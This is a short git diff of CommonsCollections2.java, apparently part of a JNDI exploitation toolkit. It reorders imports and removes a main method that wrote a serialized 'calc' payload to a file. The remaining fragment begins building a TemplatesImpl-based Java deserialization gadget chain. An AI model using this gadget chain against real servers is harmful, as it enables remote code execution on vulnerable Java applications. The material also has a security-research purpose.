@@ -3,21 +3,14 @@ package com.nu1r.jndi.gadgets;
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Gadgets;
 import com.nu1r.jndi.gadgets.utils.Reflections;
-import org.apache.commons.collections4.functors.InvokerTransformer;
 import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InvokerTransformer;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.util.PriorityQueue;
 
 public class CommonsCollections2 {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("6666.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object tpl = Gadgets.createTemplatesImpl(type, param);
